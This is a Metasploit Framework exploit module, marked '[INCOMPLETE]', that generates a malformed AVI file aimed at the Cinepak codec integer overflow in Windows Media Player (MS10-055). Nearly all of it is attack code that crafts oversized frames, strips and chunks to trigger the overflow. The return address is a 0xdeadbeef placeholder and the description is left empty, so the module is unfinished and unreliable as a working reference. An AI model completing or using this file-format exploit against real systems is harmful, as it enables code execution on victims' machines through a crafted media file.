##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::RIFF

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '[INCOMPLETE] Microsoft Windows Media Player Cinepak Codec Integer Overflow',
			'Description'    => %q{
					...
				...
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Anonymous',  # Found bug, sold to ZDI
					'jduck'       # Metasploit module
				],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '66984' ],
					[ 'MSB', 'MS10-055' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3', { 'Ret' => 0xdeadbeef } ], # ??
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 10 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.avi']),
			], self.class)
	end


	def exploit

		# Generate the malformed AVI :)
		width = 176
		height = 144
		num_frames = 3*25 # 3 seconds worth

		# Stream List
		strl = ''

		# Stream Header
		strh = ''
		strh << 'vids'  # fccType
		strh << 'cvid'  # fccHandler
		strh << [
			0x10000,     # dwFlags
			0,           # wPriority
			0,           # wLanguage
			0,           # dwInitialFrames
			0x9c40,      # dwScale
			0xf4240,     # dwRate
			0,           # dwStart
			num_frames,  # dwLength
			0,           # dwSuggestedBufferSize
			-1,          # dwQuality
			0,           # dwSampleSize
			0,0,0,0      # rcFrame (rect)
		].pack('VvvVVVVVVVVvvvv')
		strl << riff_chunk('strh', strh)

		# Stream Format
		strf = ''
		strf << [
			0x28,        # biSize
			width,       # biWidth
			height,      # biHeight
			1,           # biPlanes
			24,          # biBitCount
		].pack('VVVvv')
		strf << 'cvid'  # biCompression
		strf << [
			0,           # biSizeImage
			0,           # biXPelsPerMeter
			0,           # biYPelsPerMeter
			0,           # biClrUsed
			0,           # biClrImportant
		].pack('VVVVV')
		strl << riff_chunk('strf', strf)

		strd = "A" * 1024
		strl << riff_chunk('strd', strd)

		# Header List
		hdrl = ''

		# AVI Main Header
		avih = [
			0x9c40,      # dwMicroSecPerFrame
			0,           # dwMaxBytesPerSec
			0,           # dwPaddingGranularity
			0x10,        # dwFlags
			num_frames,  # dwTotalFrames
			0,           # dwInitialFrames
			1,           # dwStreams
			0,           # dwSuggestedBufferSize
			width,       # dwWidth
			height,      # dwHeight
			0,0,0,0      # dwReserved[4]
		].pack('VVVVVVVVVVVVVV')
		hdrl = riff_chunk('avih', avih)

		# Add  the stream list
		hdrl << riff_list_chunk('LIST', 'strl', strl)

		# The movi frames
		chnk_id = 0x20 + rand(20)
		chnk_id = 0x31

		movi = ''
		offsets = []
		fr_lens = []
		num_frames.times { |frx|
			offsets << movi.length
			if frx == 25
				fr_len = 0x1a00 + rand(0x180000)
				num_strips = 0x2000
				fr_len = num_strips * 0x300
			else
				fr_len = 0x1a00 + rand(0x200)
				num_strips = 0x40
			end
			fr_lens << fr_len

			# frame header
			frhdr = [fr_len - 0x20].pack('N')   # 24 bit len
			fr_id = rand(2)
			frhdr[0,1] = [fr_id].pack('C')      # flags (prev codebook used?)
			frhdr << [
				width,
				height,
				num_strips    # number of coded strips
			].pack('nnn')

			# strips
			strip_len = fr_len / num_strips
			num_strips.times { |stx|
				# strip header
				shdr = [strip_len].pack('N')     # 24 bit strip size
				strip_id = 0x10 + rand(2)
				shdr[0,1] = [strip_id].pack('C') # strip CVID id
				shdr << [
					0,       # top
					0,       # left
					0xffff,  # bottom
					width    # right
				].pack('nnnn')

				# CVID Chunk
				chnk = ''
				if stx == 0
					chnk_len = 0x1000 * 4
					left = strip_len - shdr.length
					while left > 0
						if left < chnk_len
							tmp = "A" * (chnk_len - 4)
						else
							tmp = [chnk_len].pack('N')  # 24 bit chunk data size
							tmp[0,1] = [chnk_id].pack('C') # CVID chunk id
							tmp << "A" * (chnk_len - 4)
						end
						chnk << tmp
						left -= tmp.length
					end
				else
					chnk_len = strip_len - shdr.length
					chnk << [chnk_len].pack('N')   # 24 bit chunk data size
					#chnk_id = 0x20 + rand(20)
					chnk[0,1] = [chnk_id].pack('C') # CVID chunk id
					chnk << rand_text(chnk_len)
				end

				fr_data = ''
				fr_data << frhdr
				fr_data << shdr
				fr_data << chnk

				movi << riff_chunk('00dc', fr_data)
			}
		}

		# Put the AVI list together
		avil = ''
		avil << riff_list_chunk('LIST', 'hdrl', hdrl)

		# Build the idx1 chunk
		idx1 = ''
		num_frames.times { |x|
			# add the hdrl, riff chunk bytes, and movi chunk bytes on
			off = offsets[x] + 0x0c + (0x0c + hdrl.length) + 0x0c
			fr_len = fr_lens[x]

			# dwChunkId
			idx1 << '00dc'
			idx1 << [
				0x12,     # dwFlags
				off,      # dwOffset
				fr_len    # dwSize
			].pack('VVV')
		}

		avil << riff_list_chunk('LIST', 'movi', movi)
		avil << riff_chunk('idx1', idx1)

		# Wrap it in the RIFF chunk
		avi = riff_list_chunk('RIFF', 'AVI ', avil)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(avi)

	end

end
